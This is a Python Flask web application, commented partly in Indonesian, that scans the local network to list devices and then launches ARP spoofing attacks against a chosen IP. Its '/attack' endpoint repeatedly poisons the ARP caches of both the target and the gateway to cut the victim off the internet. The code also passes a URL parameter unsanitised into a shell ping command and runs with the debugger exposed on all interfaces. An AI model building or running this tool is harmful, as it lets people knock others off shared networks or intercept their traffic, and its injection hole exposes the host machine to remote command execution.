from flask import Flask, render_template, request, jsonify
from scapy.all import ARP, Ether, srp, srp1, send, conf, IP, UDP, NBNSQueryRequest, DNS, DNSQR
import threading
import time
import socket
import os
import subprocess
import asyncio
from concurrent.futures import ThreadPoolExecutor, as_completed
from mac_vendor_lookup import AsyncMacLookup

app = Flask(__name__)

# Inisialisasi MAC Lookup database
# Instantiating AsyncMacLookup loads the vendors file into memory.
async_mac_lookup = AsyncMacLookup()

def update_mac_db():
    try:
        print("[INFO] Updating MAC vendor database in background...")
        # Since update_vendors is async, we need a throwaway event loop to run it in this background thread
        asyncio.run(async_mac_lookup.update_vendors())
        print("[INFO] MAC vendor database updated.")
    except Exception as e:
        print("Warning: Could not update MAC vendor list.", e)

threading.Thread(target=update_mac_db, daemon=True).start()

# --- KONFIGURASI JARINGAN SEMENTARA ---
# These will be dynamically populated by functions
# Remove hardcoded conf.iface
# conf.iface will be auto-set by scapy or detected based on route

active_attacks = {}

def get_network_info():
    """Dynamically get the default gateway and active interface IP."""
    try:
        # scapy's conf.route.route('0.0.0.0') returns (iface_name, host_ip, gateway_ip)
        _, host_ip, gateway_ip = conf.route.route("0.0.0.0")
        
        # Ensure scapy uses the correct interface for sending packets
        # conf.route.route returns the interface name (or Scapy IFACE object) 
        # that handles the 0.0.0.0 route (default route)
        default_iface = conf.route.route("0.0.0.0")[0]
        conf.iface = default_iface
        
        return host_ip, gateway_ip
    except Exception as e:
        print(f"Error detecting network: {e}")
        return None, None

def get_local_ip_mac(host_ip):
    hostname = socket.gethostname()
    return {'ip': host_ip, 'mac': 'Host Anda (Laptop)', 'vendor': 'Local Host'}

def is_random_mac(mac):
    """Checks if a MAC address is a Locally Administered Address (LAA).
    This is typical for Android/iOS devices using Privacy/Random MAC mode.
    """
    try:
        # Get the first octet
        first_octet = int(mac.split('-')[0] if '-' in mac else mac.split(':')[0], 16)
        # Check the 'locally administered' bit (second least significant bit of first byte)
        # 1-6 are the ranges, but specifically if bit 1 (0x02) is set.
        return (first_octet & 0x02) == 0x02
    except:
        return False

def get_mdns_name(ip):
    """Tries to resolve device name via MDNS (Multicast DNS)."""
    try:
        # Reverse IP for PTR query (e.g. 1.1.168.192.in-addr.arpa)
        rev_ip = ".".join(reversed(ip.split("."))) + ".in-addr.arpa"
        pkt = IP(dst="224.0.0.251")/UDP(sport=5353, dport=5353)/DNS(rd=1, qd=DNSQR(qname=rev_ip, qtype="PTR"))
        # Using srp1 for a single response
        ans = srp1(pkt, timeout=0.8, verbose=False, retry=0)
        if ans and ans.haslayer(DNS) and ans[DNS].ancount > 0:
            # Look for the name in the answer section
            for i in range(ans[DNS].ancount):
                rdata = ans[DNS].an[i].rdata
                if isinstance(rdata, bytes):
                    name = rdata.decode().rstrip('.')
                    if name: return name
    except:
        pass
    return None

def get_device_name(ip):
    """Tries to resolve device name via DNS, NetBIOS, and MDNS."""
    # 1. Try MDNS (Often very descriptive for Apple/Linux devices)
    mdns_name = get_mdns_name(ip)
    if mdns_name: return mdns_name

    # 2. Try DNS/Hostname lookup
    try:
        hostname = socket.gethostbyaddr(ip)[0]
        if hostname and not hostname.replace('.', '').isdigit():
            return hostname
    except:
        pass

    # 3. Try NetBIOS (NBNS) - Works for Windows and many Androids
    try:
        pkt = IP(dst=ip)/UDP(sport=137, dport=137)/NBNSQueryRequest(QUESTION_NAME='*')
        ans = srp1(pkt, timeout=0.5, verbose=False, retry=0)
        if ans:
             nb_name = ans.QUESTION_NAME.decode().strip()
             if nb_name:
                 return nb_name
    except:
        pass

    return None

def get_vendor(mac):
    try:
        if mac.lower() in ['ff-ff-ff-ff-ff-ff', 'ff:ff:ff:ff:ff:ff']:
            return 'Broadcast'
            
        if is_random_mac(mac):
            return 'Private Device (Android/iOS)'
            
        # MacLookup expects colons, windows arp returns dashes, normalize it:
        normalized_mac = mac.replace('-', ':')
        # Use asyncio.run to create a fresh loop for this worker thread and run the lookup
        vendor = asyncio.run(async_mac_lookup.lookup(normalized_mac))
        return vendor
    except Exception as e:
        # Fallback if lookup fails or database not ready
        return 'Unknown Brand'

def get_mac(ip):
    try:
        ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=2, verbose=False)
        if ans: return ans[0][1].hwsrc
    except: return None
    return None

def spoof(target_ip, spoof_ip, target_mac):
    # Send packet to target instructing it that the spoof_ip (gateway) is at our MAC
    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    # Broadcast alternative (more aggressive):
    # packet = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    send(packet, verbose=False)

def spoof_loop(target_ip, gateway_ip):
    target_mac = get_mac(target_ip)
    gateway_mac = get_mac(gateway_ip)
    
    # We should act as a blackhole, meaning we tell the target we are the gateway,
    # but we DO NOT forward packets (unless IP forwarding is enabled at the OS level).
    # To drop internet, we shouldn't necessarily spoof the gateway back unless needed,
    # but doing both is common. The target sending packets to us is enough if we drop them.
    
    while active_attacks.get(target_ip):
        if not target_mac: target_mac = get_mac(target_ip)
        if not gateway_mac: gateway_mac = get_mac(gateway_ip)
        
        if target_mac and gateway_mac:
            # Tell target we are the gateway
            spoof(target_ip, gateway_ip, target_mac)
            # Tell gateway we are the target
            spoof(gateway_ip, target_ip, gateway_mac)
        
        # Aggressive sleep: 0.3s to beat original router's ARP refreshes
        time.sleep(0.3)

@app.route('/status')
def status():
    """Returns current network status for the frontend."""
    host_ip, gateway_ip = get_network_info()
    iface = conf.iface if hasattr(conf, 'iface') else "Unknown"
    # Convert iface object to string if necessary
    if not isinstance(iface, str):
        try:
            iface = str(iface.name)
        except:
            iface = str(iface)

    return jsonify({
        "host_ip": host_ip,
        "gateway_ip": gateway_ip,
        "interface": iface,
        "attacked_ips": [ip for ip, active in active_attacks.items() if active]
    })

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/scan', methods=['GET'])
def scan():
    if not conf.use_pcap:
        return jsonify({"error": "Npcap is missing or not working! Please install Npcap in WinPcap API-compatible mode to enable scanning."}), 500
        
    try:
        host_ip, gateway_ip = get_network_info()
        if not host_ip or not gateway_ip:
            return jsonify({"error": "Gagal mendeteksi gateway jaringan. Pastikan terkoneksi ke WiFi/LAN."}), 500
            
        # Extract subnet prefix (e.g., '192.168.1' from '192.168.1.X')
        subnet = ".".join(gateway_ip.split(".")[:3])
        
        def ping_all():
            for i in range(1, 255):
                os.system(f"ping -n 1 -w 50 {subnet}.{i} > nul")
        
        threading.Thread(target=ping_all).start()
        time.sleep(4)
        devices = [get_local_ip_mac(host_ip)]
        devices[0]['subnet'] = subnet # Pass subnet info to frontend
        result = subprocess.check_output("arp -a", shell=True).decode()
        
        # Collect detected devices from ARP table
        potential_devices = []
        for line in result.splitlines():
            if "dynamic" in line or "static" in line:
                parts = line.split()
                if len(parts) >= 3:
                    ip = parts[0]
                    mac = parts[1]
                    if ip.startswith(subnet):
                        potential_devices.append((ip, mac))
        
        # Define verification function for parallel execution
        def verify_device(ip, mac):
            name = get_device_name(ip)
            vendor = get_vendor(mac)
            
            # Identity labeling
            if name:
                if vendor and vendor not in ['Private Device (Android/iOS)', 'Unknown Brand', 'Broadcast']:
                    full_identity = f"{name} ({vendor})"
                else:
                    full_identity = name
            else:
                full_identity = vendor
                
            # Robust Verification: 1.0s timeout, 2 retries
            # Ether/ARP is more reliable than ICMP Ping
            arp_reply = srp1(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=1.0, verbose=False, retry=2)
            
            if arp_reply:
                return {'ip': ip, 'mac': mac, 'vendor': full_identity}
            return None

        # Execute parallel verification
        with ThreadPoolExecutor(max_workers=20) as executor:
            futures = [executor.submit(verify_device, ip, mac) for ip, mac in potential_devices]
            for future in as_completed(futures):
                dev = future.result()
                if dev:
                    devices.append(dev)
                        
        return jsonify(devices)
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/ping/<ip>')
def ping(ip):
    """Pings a specific device and returns latency."""
    try:
        # Use ping -n 1 -w 1000 for a single packet on Windows
        # Output is like: "... time=5ms ..."
        output = subprocess.check_output(f"ping -n 1 -w 1000 {ip}", shell=True).decode()
        if "time=" in output:
            # Extract time=Xms
            time_str = output.split("time=")[1].split("ms")[0].strip()
            return jsonify({"status": "Online", "latency": f"{time_str}ms"})
        elif "time<" in output:
             return jsonify({"status": "Online", "latency": "<1ms"})
        return jsonify({"status": "Offline", "latency": "TIMEOUT"})
    except:
        return jsonify({"status": "Offline", "latency": "OFF"})

@app.route('/attack', methods=['POST'])
def attack():
    if not conf.use_pcap:
        return jsonify({"status": "Error", "message": "Npcap is required to attack."}), 500
        
    data = request.json
    target_ip = data['ip']
    
    _, gateway_ip = get_network_info()
    if not gateway_ip:
        return jsonify({"status": "Error", "message": "Gagal mendapatkan Gateway IP."}), 500
        
    active_attacks[target_ip] = True
    threading.Thread(target=spoof_loop, args=(target_ip, gateway_ip), daemon=True).start()
    return jsonify({"status": "Attacking " + target_ip})

@app.route('/stop', methods=['POST'])
def stop():
    data = request.json
    target_ip = data['ip']
    active_attacks[target_ip] = False
    return jsonify({"status": "Stopped"})

if __name__ == '__main__':
    # host='0.0.0.0' allows access from other devices on the same network
    app.run(debug=True, host='0.0.0.0', port=5000)